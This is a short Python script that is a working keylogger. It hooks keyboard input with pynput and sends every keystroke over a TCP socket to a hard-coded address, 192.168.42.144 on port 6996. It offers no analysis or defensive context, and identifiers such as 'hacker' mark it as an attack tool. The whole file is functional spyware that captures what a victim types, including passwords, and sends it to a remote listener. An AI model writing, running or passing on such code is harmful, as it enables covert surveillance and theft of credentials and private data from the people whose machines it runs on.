import socket
import os
import sys
HOST = "192.168.42.144"
PORT = 6996
ADDR = (HOST,PORT)
from pynput.keyboard import Listener
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(ADDR)

def anonymous(key):
	key=str(key)
	key=key.replace("'","")
	if key == "Key.crtl_l":
		key="\n"
	if key == "Key.enter":
		key="\n"
	if key == "Key.alt_l":
		key="\n"
	if key == "Key.tab":
		key="\n"
	if key == "Key.f12":
		raise SystemExit(0)
	s.send(key.encode('ascii'))
	# with open("log.txt","a") as file:
	# 	file.write(key)
with Listener(on_press=anonymous) as hacker:
	hacker.join() 


